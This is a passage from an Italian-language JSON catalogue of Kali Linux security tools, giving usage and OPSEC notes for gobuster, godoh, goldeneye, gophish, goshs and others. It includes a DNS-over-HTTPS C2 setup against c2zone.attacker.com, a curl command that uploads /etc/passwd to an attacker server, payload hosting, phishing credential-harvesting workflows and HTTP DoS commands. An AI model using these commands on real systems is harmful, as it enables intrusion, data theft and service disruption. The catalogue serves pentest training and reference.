organization_name --max-repos 50\n\n# === ANALISI UTENTE ===\n# Profila un singolo sviluppatore\ngitxray -u username\n\n# === OUTPUT OPTIONS ===\n# Report JSON strutturato\ngitxray -r https://github.com/user/repo --json -o report.json\n\n# Output verbose\ngitxray -r https://github.com/user/repo -v\n\n# === FILTRI ===\n# Solo commit recenti\ngitxray -r https://github.com/user/repo --since 2024-01-01\n\n# Focus su file specifici\ngitxray -r https://github.com/user/repo --files \"*.yml,*.json\"</code></pre><p>I risultati includono tutti i dati estratti organizzati per contributor con metadati correlati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT Investigation</strong>, GitXray permette di profilare sviluppatori, trovare email e chiavi SSH, correlare identità tra progetti diversi, e costruire una mappa delle relazioni tra contributor in un ecosistema software.</p><p>Nella <strong>Supply Chain Security</strong>, analizzare i contributor delle dipendenze del proprio software aiuta a identificare potenziali rischi: account nuovi che fanno modifiche critiche, contributor con storia sospetta, o pattern che indicano account compromessi.</p><p>Per <strong>Threat Intelligence</strong>, quando threat actor usano GitHub per hosting di tool, C2 config, o exfiltration, GitXray aiuta a tracciare le loro attività, correlare account, e identificare altra infrastruttura collegata.</p><p>Durante <strong>Incident Response</strong>, se un attacco coinvolge codice da GitHub, l'analisi dei contributor può rivelare se il repository è stato compromesso, quando, e da chi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>API Rate Limiting:</strong> GitHub limita le richieste API (60/ora senza autenticazione, 5000/ora con token). Analisi di grandi organizzazioni richiedono token autenticato e possono richiedere tempo.</p><p><strong>Dati Pubblici:</strong> GitXray accede solo a informazioni pubbliche disponibili via API GitHub. Non viola alcuna policy di GitHub, ma aggregare questi dati può rivelare più di quanto gli utenti intendano esporre.</p><p><strong>Token Security:</strong> Se si usa un token GitHub per aumentare i rate limit, assicurarsi che abbia permessi minimi (solo read:user e repo per repo pubblici). Non esporre token con permessi di scrittura.</p><p><strong>Attribution:</strong> Le richieste API sono associate all'account del token usato. Per analisi sensibili, considerare l'uso di account dedicati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Git_Recon"
    ],
    "notes": null
  },
  {
    "id": "gobuster",
    "name": "gobuster",
    "version": "3.8.0",
    "icon": "../app/icons/gobuster-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gobuster/",
    "desc": "Brute forcer in Go per directory web, DNS subdomain, vhost e S3 bucket enumeration.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Gobuster</strong> è un tool di brute forcing scritto in Go per enumerazione di directory web, subdomain DNS, vhost e bucket S3. Estremamente veloce grazie alla concorrenza di Go, è uno dei tool più usati per content discovery. Supporta estensioni, status code filtering e output multipli.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Dir Mode:</strong> Enumera directory e file web.</p><p><strong>DNS Mode:</strong> Brute force di subdomain.</p><p><strong>VHost Mode:</strong> Enumera virtual host.</p><p><strong>S3 Mode:</strong> Trova bucket S3 pubblici.</p><p><strong>High Speed:</strong> Scritto in Go per performance.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Directory enum con estensioni, status code e dimensione filtro\ngobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \\\n  -x php,html,txt,bak,old,zip -b 404,403 -s 200,301,302 --exclude-length 0\n\n# VHost discovery con wildcard filtering\ngobuster vhost -u https://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \\\n  --append-domain --exclude-length 301\n\n# Subdomain con resolver custom e rate limit\ngobuster dns -d target.com -w subdomains.txt -r 8.8.8.8 --delay 100ms -t 30\n\n# S3 bucket enumeration\ngobuster s3 -w bucket-names.txt --maxdepth 2\n\n# Fuzzing URL con pattern FUZZ\ngobuster fuzz -u https://target.com/api/v1/FUZZ -w params.txt -b 404\n\n# Pipeline completa: proxy attraverso Burp + output JSON\ngobuster dir -u https://target.com -w wordlist.txt -x php \\\n  --proxy http://127.0.0.1:8080 -o results.json --no-tls-validation -q\n\n# Recursive discovery con profondità\ngobuster dir -u https://target.com -w wordlist.txt -r --depth 3 -t 50</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Recon</strong>, trova directory e file nascosti.</p><p>Nel <strong>Bug Bounty</strong>, enumera subdomain e vhost.</p><p><strong>Pentest</strong> per content discovery completa.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Noisy:</strong> Genera molte request. Usa -t per controllare thread, --delay per rate limiting.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "godoh",
    "name": "godoh",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/godoh/",
    "desc": "C2 agent DNS-over-HTTPS per comunicazioni nascoste che bypassano filtri DNS tradizionali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GoDOH</strong> e un proof-of-concept di Command and Control (C2) scritto in Go che sfrutta il protocollo DNS-over-HTTPS (DoH) per stabilire comunicazioni nascoste tra un agente compromesso e il server di controllo dell'attaccante. A differenza dei tradizionali tunnel DNS che generano query DNS anomale facilmente rilevabili, GoDOH incapsula i comandi all'interno di richieste HTTPS verso provider DoH legittimi come Google (dns.google) e Cloudflare (cloudflare-dns.com), rendendo il traffico C2 visivamente indistinguibile dalla normale navigazione web. Il progetto dimostra come il protocollo DoH, nato per migliorare la privacy degli utenti cifrando le query DNS, possa essere abusato come canale di comunicazione covert per operazioni offensive. L'architettura client-server permette l'esecuzione remota di comandi, il trasferimento di file e l'esfiltrazione di dati attraverso un canale che la maggior parte dei dispositivi di sicurezza di rete non ispeziona adeguatamente.</p><br><hr><h4 class=\"rt-purple\">Funzionalita principali</h4><p><strong>Tunneling C2 via DNS-over-HTTPS:</strong> GoDOH codifica comandi e risposte all'interno di query e risposte DNS trasportate su HTTPS verso provider DoH pubblici. Le comunicazioni appaiono come normali richieste HTTPS verso domini affidabili come dns.google o cloudflare-dns.com, bypassando efficacemente firewall, proxy e sistemi IDS che non ispezionano il contenuto delle connessioni HTTPS verso questi provider. Il dominio controllato dall'attaccante funge da autoritativo per una zona DNS specifica, ricevendo le query DoH reindirizzate dai provider.</p><p><strong>Supporto multiplo provider DoH:</strong> L'agente puo essere configurato per utilizzare diversi provider DoH come canale di trasporto, tra cui Google DNS, Cloudflare DNS e altri servizi DoH pubblici. Questa flessibilita consente di selezionare il provider che meglio si mimetizza nel traffico di rete dell'ambiente target, poiche molti browser moderni utilizzano gia DoH nativamente, rendendo queste connessioni parte del traffico di baseline della rete.</p><p><strong>Esecuzione comandi e esfiltrazione dati:</strong> Attraverso il canale DoH, l'operatore puo inviare comandi shell all'agente compromesso e ricevere l'output codificato nelle risposte DNS. Il tool supporta anche il trasferimento di file bidirezionale, frammentando i dati in chunk codificati che vengono trasmessi attraverso multiple query DNS. Questa capacita di esfiltrazione e particolarmente insidiosa perche il traffico risultante e cifrato e diretto verso destinazioni considerate affidabili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>GoDOH richiede il controllo di un dominio con record NS configurati per puntare al server C2 dell'attaccante. Il provider DoH funge da intermediario inconsapevole, inoltrando le query DNS per il dominio controllato al server autoritativo dell'attaccante.</p><pre><code># Configurazione prerequisiti: dominio con NS record che punta al server C2\n# Esempio: c2zone.attacker.com NS -> ns1.attacker.com\n\n# Avvio del server C2 (lato attaccante)\ngodoh --provider google --domain c2zone.attacker.com receive\n\n# Avvio dell'agente sul target compromesso\ngodoh --provider google --domain c2zone.attacker.com send\n\n# Il server C2 riceve una shell interattiva\n# I comandi vengono codificati in query DoH\n# Le risposte tornano attraverso lo stesso canale\n\n# Utilizzo con provider Cloudflare alternativo\ngodoh --provider cloudflare --domain c2zone.attacker.com receive</code></pre><p>E fondamentale configurare correttamente i record DNS del dominio controllato prima di avviare il C2. La latenza delle comunicazioni e superiore rispetto a C2 tradizionali a causa dell'overhead del protocollo DNS e della codifica dei dati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante operazioni di <strong>Red Team in ambienti ad alta sicurezza</strong>, GoDOH fornisce un canale C2 alternativo quando i metodi tradizionali (HTTP/HTTPS diretto, DNS tunneling classico) sono bloccati o monitorati. In reti dove il traffico e fortemente filtrato ma le connessioni DoH verso provider noti sono permesse, questo tool puo mantenere la persistenza delle comunicazioni con gli agenti impiantati. Per attivita di <strong>ricerca e detection engineering</strong>, GoDOH serve come generatore di traffico DoH malevolo per sviluppare e testare regole di rilevamento nei SIEM e nei sistemi di network monitoring. I team di sicurezza difensiva possono utilizzare il tool per capire come appare il traffico C2 via DoH e costruire firme di detection appropriate. Nel contesto di <strong>security assessment delle policy di rete</strong>, l'utilizzo di GoDOH dimostra ai clienti l'insufficienza di bloccare solo il DNS tradizionale (porta 53) senza considerare i canali DoH, evidenziando la necessita di policy che controllino anche le connessioni HTTPS verso provider DoH noti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene il traffico sia cifrato via HTTPS, il volume anomalo di query DNS verso un singolo dominio attraverso provider DoH puo essere rilevato tramite analisi comportamentale. Soluzioni EDR avanzate possono identificare il processo che effettua connessioni DoH anomale. Il dominio controllato dall'attaccante potrebbe essere identificato e bloccato tramite threat intelligence. I provider DoH stessi potrebbero implementare rate limiting o blocco per domini sospetti.</p><p><strong>Impatto operativo:</strong> La latenza del canale C2 e significativamente superiore rispetto a connessioni dirette, rendendo le operazioni interattive lente. La banda disponibile e limitata dalla dimensione massima dei record DNS, rendendo l'esfiltrazione di grandi quantita di dati estremamente lenta. Il server C2 richiede un dominio registrato e infrastruttura DNS dedicata, aumentando i costi operativi e il footprint dell'attaccante.</p><p><strong>Mitigazioni:</strong> Variare i provider DoH utilizzati e implementare jitter nelle comunicazioni per ridurre i pattern rilevabili. Utilizzare domini con reputation pulita e registrati da tempo. Limitare il volume di dati esfiltrati attraverso il canale DoH, preferendo canali alternativi per trasferimenti di grandi dimensioni. Monitorare attentamente i log del provider DoH per eventuali blocchi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "goldeneye",
    "name": "goldeneye",
    "version": "1.2.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/goldeneye/",
    "desc": "HTTP DoS test tool che usa Keep-Alive e pipelining per stress testing di web server.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GoldenEye</strong> è un tool per stress testing HTTP che sfrutta le funzionalità Keep-Alive e HTTP pipelining per consumare risorse del web server target. Mantiene molte connessioni TCP aperte simultaneamente inviando request HTTP incomplete o rallentate, esaurendo progressivamente i worker thread/processi disponibili sul server. È un tool di tipo \"Slowloris-style\" scritto in Python che permette di verificare la resilienza dell'infrastruttura web contro attacchi di tipo application-layer DoS. IMPORTANTE: da utilizzare esclusivamente per testing autorizzato su propri sistemi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Keep-Alive Connection Abuse:</strong> mantiene connessioni HTTP aperte il più a lungo possibile sfruttando Keep-Alive, occupando slot di connessione sul server e impedendo a client legittimi di connettersi quando i worker sono esauriti.</p><p><strong>Randomized Request Headers:</strong> genera User-Agent, Referer e altri header HTTP casuali per ogni connessione, rendendo più difficile il blocking basato su signature e simulando traffico da client diversi.</p><p><strong>Multi-threaded Architecture:</strong> gestisce centinaia o migliaia di connessioni parallele distribuite su multiple thread, massimizzando la pressione sulle risorse del server target.</p><p><strong>Configurable Attack Parameters:</strong> permette di configurare numero di worker, socket per worker, metodo HTTP (GET/POST), e altri parametri per calibrare l'intensità del test in base alle caratteristiche del target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># ATTENZIONE: SOLO SU SISTEMI PROPRI CON AUTORIZZAZIONE!\n\n# Test base con parametri default\ngoldeneye http://your-server.com\n\n# Con numero specifico di worker e socket\ngoldeneye http://your-server.com -w 100 -s 500\n\n# Usando metodo POST\ngoldeneye http://your-server.com -m POST\n\n# Con debug output\ngoldeneye http://your-server.com -d\n\n# Test specifico endpoint\ngoldeneye http://your-server.com/api/endpoint -w 50 -s 100</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Server Stress Testing</strong>, verificare la resilienza e i limiti della propria infrastruttura web contro attacchi di tipo slowloris e connection exhaustion prima del deployment in produzione.</p><p>Per <strong>Capacity Planning</strong>, determinare quante connessioni simultanee il server può gestire e identificare i colli di bottiglia nell'architettura per dimensionare correttamente le risorse.</p><p>Per <strong>WAF/DoS Protection Testing</strong>, verificare che le protezioni anti-DoS implementate (rate limiting, connection limits, WAF rules) funzionino correttamente nel bloccare questo tipo di attacchi.</p><p>Per <strong>Incident Response Training</strong>, simulare attacchi DoS in ambiente controllato per addestrare il team a riconoscere e rispondere a questo tipo di incidenti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>ATTENZIONE LEGALE:</strong> utilizzare ESCLUSIVAMENTE su sistemi propri o con autorizzazione scritta esplicita. Gli attacchi DoS sono reati penali in quasi tutte le giurisdizioni. Questo tool è destinato esclusivamente a stress testing legittimo e security assessment autorizzato, non per attacchi. Anche test autorizzati possono causare disservizi - pianificare finestre di manutenzione appropriate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Vulnerability_Scanning"
    ],
    "notes": null
  },
  {
    "id": "goofile",
    "name": "goofile",
    "version": "1.6",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/goofile/",
    "desc": "Cerca file specifici (PDF, DOC, XLS) su un dominio usando Google dorks automatizzati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Goofile</strong> è un tool OSINT che automatizza la ricerca di file di specifiche tipologie su un dominio target utilizzando Google dorks. Costruisce automaticamente query \"site:domain.com filetype:ext\" per trovare documenti PDF, DOC, DOCX, XLS, XLSX, PPT, PPTX e molti altri formati indicizzati da Google. I file trovati rappresentano una miniera di informazioni per la reconnaissance: possono contenere metadati sensibili (autori, software, path interni), indirizzi email, username, informazioni sulla struttura organizzativa e dati che non dovrebbero essere pubblici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Automated Google Dorking:</strong> costruisce e esegue automaticamente query Google con operatori site: e filetype: per ogni tipo di file richiesto, gestendo paginazione dei risultati per ottenere liste complete.</p><p><strong>Multiple File Type Support:</strong> supporta ricerca di PDF, DOC/DOCX, XLS/XLSX, PPT/PPTX, TXT, RTF, ODT, e qualsiasi altra estensione file indicizzabile da Google.</p><p><strong>Domain-Scoped Search:</strong> limita la ricerca esclusivamente al dominio target specificato, filtrando risultati da altri siti e focalizzando la reconnaissance.</p><p><strong>Clean URL Output:</strong> genera lista pulita di URL diretti ai file trovati, pronta per download massivo con wget/curl o analisi con tool di metadata extraction come FOCA o ExifTool.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Cerca documenti PDF su un dominio\ngoofile -d target.com -f pdf\n\n# Cerca documenti Word\ngoofile -d target.com -f doc\ngoofile -d target.com -f docx\n\n# Cerca spreadsheet Excel\ngoofile -d target.com -f xls\ngoofile -d target.com -f xlsx\n\n# Cerca presentazioni PowerPoint\ngoofile -d target.com -f ppt\n\n# Workflow completo OSINT:\n# 1. Trova file\ngoofile -d target.com -f pdf &gt; pdf_urls.txt\n\n# 2. Scarica tutti i PDF\nwget -i pdf_urls.txt -P ./downloads/\n\n# 3. Estrai metadata con exiftool\nexiftool ./downloads/*.pdf\n\n# 4. Oppure usa FOCA per analisi approfondita</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT &amp; Reconnaissance</strong>, trovare documenti pubblicamente accessibili che rivelano informazioni sulla struttura interna, progetti, dipendenti e tecnologie utilizzate dal target.</p><p>Per <strong>Metadata Extraction</strong>, raccogliere file per estrarre metadati con tool come FOCA, ExifTool o Metagoofil - spesso rivelano username, path di rete interni, versioni software e altre informazioni sensibili.</p><p>Per <strong>Information Leakage Assessment</strong>, identificare documenti che contengono informazioni che non dovrebbero essere pubbliche (policy interne, credenziali, dati personali) per security assessment.</p><p>Per <strong>Social Engineering Preparation</strong>, raccogliere nomi, ruoli ed email da documenti per preparare campagne di spear phishing mirate e credibili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Passive Reconnaissance:</strong> il tool interroga solo Google, non contatta direttamente il target, rendendo questa fase di reconnaissance completamente passiva e non rilevabile. Tuttavia, Google può applicare rate limiting o CAPTCHA per query frequenti. Per analisi approfondita dei metadata, combinare con FOCA o Metagoofil dopo il download dei file.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence",
      "Metadata"
    ],
    "notes": null
  },
  {
    "id": "gophish",
    "name": "gophish",
    "version": "0.12.1",
    "icon": "../app/icons/gophish-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gophish/",
    "desc": "Framework open source per campagne di phishing con tracking, template e reporting.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GoPhish</strong> è il framework open source di riferimento per simulazioni di phishing e programmi di security awareness training. Gestisce l'intero ciclo di vita delle campagne di phishing: creazione di email convincenti con editor template, costruzione di landing page per credential harvesting, gestione di gruppi di utenti target, invio programmato delle email, tracking granulare di aperture/click/submit, e reporting dettagliato con metriche e grafici. L'interfaccia web moderna e intuitiva rende accessibile la creazione di campagne professionali anche senza competenze tecniche avanzate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Email Template Editor:</strong> editor WYSIWYG completo per creare email di phishing convincenti con supporto HTML, variabili dinamiche (nome, cognome, email del target), allegati e tracking pixel invisibile per monitorare le aperture.</p><p><strong>Landing Page Builder:</strong> crea pagine di login realistiche che clonano siti reali (Office 365, Google, banking) per catturare credenziali, con supporto per redirect post-submit e capture di dati custom.</p><p><strong>Campaign Management:</strong> gestisce gruppi di utenti target importabili da CSV, scheduling di invio con throttling per evitare spam filter, e A/B testing di template diversi per ottimizzare i risultati.</p><p><strong>Real-time Tracking &amp; Analytics:</strong> dashboard in tempo reale che traccia email inviate, aperture (via tracking pixel), click sui link, credenziali inserite e timeline completa delle interazioni per ogni utente target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvia il server GoPhish\n./gophish\n\n# Accedi alla dashboard web\n# URL: https://localhost:3333\n# Credenziali default: admin / gophish (cambiare subito!)\n\n# Setup workflow:\n# 1. Sending Profile: configura SMTP server per invio\n#    - Server SMTP (proprio o servizio come SendGrid)\n#    - Email mittente e nome visualizzato\n#    - Test invio per verificare configurazione\n\n# 2. Email Template: crea email di phishing\n#    - Importa HTML o usa editor WYSIWYG\n#    - Aggiungi variabili: {{.FirstName}}, {{.Email}}\n#    - Includi link tracciato: {{.URL}}\n\n# 3. Landing Page: crea pagina di harvesting\n#    - Importa sito esistente o crea da zero\n#    - Configura campi da catturare\n#    - Imposta redirect post-submit\n\n# 4. Users &amp; Groups: importa target\n#    - Upload CSV con nome, cognome, email\n#    - Organizza in gruppi per campagne diverse\n\n# 5. Campaign: lancia la campagna\n#    - Seleziona template, landing, gruppo\n#    - Imposta schedule e URL tracking\n#    - Monitora risultati in real-time</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Security Awareness Training</strong>, condurre programmi strutturati di formazione anti-phishing testando i dipendenti con simulazioni realistiche e fornendo feedback educativo immediato a chi cade nella trappola.</p><p>Per <strong>Red Team Engagements</strong>, eseguire campagne di phishing controllate come vettore di initial access durante penetration test, con tracking completo per il report finale.</p><p>Per <strong>Compliance &amp; Audit</strong>, dimostrare l'implementazione di programmi di security awareness richiesti da normative (GDPR, ISO 27001, PCI-DSS) con metriche e report esportabili.</p><p>Per <strong>Phishing Resilience Metrics</strong>, misurare nel tempo il miglioramento della resistenza al phishing dell'organizzazione attraverso campagne periodiche con metriche comparabili.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Autorizzazione Obbligatoria:</strong> richiede SEMPRE autorizzazione scritta esplicita dal management e coordinamento con HR/Legal. Configurare correttamente SPF, DKIM e DMARC per massimizzare deliverability ed evitare che le email finiscano in spam. Non utilizzare MAI per phishing non autorizzato - è reato penale. Considerare l'impatto psicologico sui dipendenti e prevedere comunicazione post-campagna.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "goshs",
    "name": "goshs",
    "version": "1.1.0",
    "icon": "../app/icons/goshs-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/goshs/",
    "desc": "SimpleHTTPServer in Go con upload, WebDAV, SSL e auth per file transfer rapido.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GoSHS</strong> (Go Simple HTTP Server) è una versione potenziata e moderna del classico Python SimpleHTTPServer, riscritta in Go per performance e portabilità. Aggiunge funzionalità essenziali per penetration testing e red team operations: upload di file bidirezionale, supporto WebDAV per mount remoto come drive di rete, SSL/TLS con certificati auto-generati, autenticazione HTTP Basic, directory listing personalizzabile e logging dettagliato. È il tool perfetto per trasferimento file rapido durante engagement, hosting di payload e raccolta di dati esfiltrati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Bidirectional File Transfer:</strong> oltre al classico download, permette upload di file dal client al server tramite interfaccia web o curl, essenziale per ricevere output di comandi, dump di credenziali e altri dati dal target compromesso.</p><p><strong>WebDAV Support:</strong> espone la directory come share WebDAV permettendo ai client di montarla come drive di rete, utile per trasferire file da sistemi Windows che possono mappare network drive.</p><p><strong>SSL/TLS Encryption:</strong> genera automaticamente certificati self-signed per connessioni HTTPS, proteggendo il traffico da intercettazione durante trasferimenti su reti non trusted.</p><p><strong>HTTP Basic Authentication:</strong> protegge il server con username e password, impedendo accesso non autorizzato ai file esposti e tracciando chi si connette.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Server HTTP base sulla porta 8000\ngoshs\n\n# Con upload abilitato (essenziale per ricevere file)\ngoshs -u\n\n# Con SSL/TLS per connessioni cifrate\ngoshs -s\n\n# Porta e directory custom\ngoshs -p 8080 -d /path/to/share\n\n# Con autenticazione HTTP Basic\ngoshs -U pentester -P secretpass\n\n# Combinazione completa per engagement\ngoshs -u -s -p 443 -U user -P pass -d ./loot\n\n# WebDAV mode\ngoshs -w -d /path/to/share\n\n# Download da target Windows (PowerShell)\nInvoke-WebRequest -Uri http://attacker:8000/tool.exe -OutFile tool.exe\n\n# Upload da target Linux\ncurl -F \"file=@/etc/passwd\" http://attacker:8000/upload\n\n# Mount WebDAV su Windows\nnet use Z: http://attacker:8000/webdav</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>File Transfer During Engagement</strong>, trasferire rapidamente tool, exploit e payload verso il target compromesso, e ricevere output, dump e loot dal target verso la macchina attaccante.</p><p>Per <strong>Payload Hosting</strong>, servire payload malevoli, script PowerShell, binari e altri file che il target deve scaricare durante l'exploitation, con supporto HTTPS per evitare detection.</p><p>Per <strong>Data Exfiltration Receiver</strong>, ricevere dati esfiltrati dal target quando può effettuare connessioni HTTP/HTTPS outbound verso l'attaccante.</p><p>Per <strong>Staging Server</strong>, creare rapidamente un server temporaneo per staging di file durante operazioni red team senza necessità di infrastruttura complessa.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Exposure Control:</strong> non esporre mai su internet senza autenticazione - chiunque potrebbe accedere ai file. Usare sempre SSL per evitare intercettazione del traffico e delle credenziali. Il server logga tutte le connessioni - utile per tracking ma anche potenziale IoC. Considerare firewall rules per limitare chi può connettersi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "gospider",
    "name": "gospider",
    "version": "1.1.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gospider/",
    "desc": "Web spider veloce in Go per crawling, estrazione link, JS parsing e sitemap discovery.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GoSpider</strong> è un web spider ad alte prestazioni scritto in Go, progettato per crawling veloce e completo di siti web durante reconnaissance. Estrae URL da multiple sorgenti: parsing HTML per link e form, analisi di file JavaScript per endpoint API nascosti, parsing di sitemap.xml e robots.txt, e integrazione con Wayback Machine per URL storici. L'output pulito e strutturato è facilmente integrabile in pipeline con altri tool (httpx, nuclei, ffuf) per una reconnaissance web completa e automatizzata.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>High-Performance Crawling:</strong> scritto in Go con goroutine per crawling parallelo ad alta velocità, gestisce migliaia di URL rapidamente con controllo granulare su concorrenza, timeout e retry.</p><p><strong>JavaScript URL Extraction:</strong> parsing intelligente di file JavaScript per estrarre endpoint API, URL hardcoded, path di risorse e altri URL nascosti che non appaiono nell'HTML ma sono usati dall'applicazione.</p><p><strong>Multi-Source Discovery:</strong> analizza automaticamente sitemap.xml per struttura completa del sito, robots.txt per path \"nascosti\" che il sito vuole escludere dai motori, e form HTML per endpoint di submit.</p><p><strong>Wayback Machine Integration:</strong> interroga Internet Archive per recuperare URL storici del dominio, rivelando endpoint deprecati, pagine rimosse e path che potrebbero essere ancora accessibili.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Crawl base di un sito\ngospider -s https://target.com\n\n# Con profondità di crawling specificata\ngospider -s https://target.com -d 3\n\n# Include URL da Wayback Machine\ngospider -s https://target.com --wayback\n\n# Include URL da altri archivi (CommonCrawl, VirusTotal)\ngospider -s https://target.com --other-source\n\n# Output su file\ngospider -s https://target.com -o ./output/\n\n# Con concorrenza e delay custom\ngospider -s https://target.com -c 10 --delay 100\n\n# Crawl di lista siti\ngospider -S sites.txt -o ./output/ -c 5\n\n# Pipeline completa bug bounty:\ngospider -s https://target.com -d 2 --wayback --other-source -o raw_urls.txt\ncat raw_urls.txt | httpx -silent | nuclei -t nuclei-templates/\n\n# Solo JavaScript files\ngospider -s https://target.com --js</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Web Application Reconnaissance</strong>, mappare completamente la struttura di un sito web identificando tutte le pagine, endpoint, risorse e funzionalità esposte come primo step di un assessment.</p><p>Per <strong>Bug Bounty Hunting</strong>, scoprire endpoint nascosti in file JavaScript, path storici da Wayback Machine e URL che potrebbero contenere vulnerabilità non testate.</p><p>Per <strong>Attack Surface Discovery</strong>, identificare tutti i punti di ingresso di un'applicazione web per pianificare test di sicurezza mirati e completi.</p><p>Per <strong>Automated Security Pipelines</strong>, integrare in workflow automatizzati con httpx per probing, nuclei per vulnerability scanning e altri tool per reconnaissance su larga scala.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Active Reconnaissance:</strong> il crawling genera traffico HTTP significativo verso il target ed è facilmente loggabile. Rispettare robots.txt se richiesto dalle regole di engagement. Usare rate limiting (--delay) per ridurre l'impatto e evitare ban. User-Agent è configurabile per blending.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Web",
      "Crawling",
      "Active"
    ],
    "notes": null
  },
  {
    "id": "gowitness",
    "name": "gowitness",
    "version": "3.0.5",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/gowitness/",
    "desc": "Screenshot tool web in Go con headless Chrome per recon visuale su larga scala.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>GoWitness</strong> è un tool per catturare screenshot di siti web scritto in Go, progettato per visual reconnaissance su larga scala. Utilizza headless Chrome/Chromium per rendering accurato di pagine web moderne (incluse SPA JavaScript-heavy) e supporta scansione massiva di migliaia di URL. Rappresenta un'alternativa più leggera e veloce a EyeWitness, con database SQLite integrato per gestione persistente dei risultati, server web per visualizzazione gallery, e supporto per import da Nmap e altri tool di discovery.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Headless Chrome Rendering:</strong> utilizza Chrome/Chromium in modalità headless per screenshot pixel-perfect di pagine web, con rendering completo di JavaScript, CSS e contenuti dinamici per catturare esattamente ciò che un utente vedrebbe.</p><p><strong>Mass URL Processing:</strong> processa migliaia di URL in parallelo con controllo su concorrenza, timeout e retry, ideale per screenshot di intere subnet o liste di asset discovery.</p><p><strong>SQLite Results Database:</strong> archivia tutti i risultati (screenshot, URL, titoli, header) in database SQLite queryable, permettendo analisi offline, ricerche e report strutturati.</p><p><strong>Built-in Web Gallery:</strong> server web integrato che presenta i risultati in una gallery navigabile con thumbnail, filtri e ricerca, perfetto per triage visuale e condivisione con il team.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Screenshot di singolo URL\ngowitness single https://target.com\n\n# Screenshot da file con lista URL\ngowitness file -f urls.txt\n\n# Da output Nmap XML (screenshot di tutti i web server trovati)\ngowitness nmap -f nmap_scan.xml\n\n# Con opzioni di concorrenza e timeout\ngowitness file -f urls.txt --threads 10 --timeout 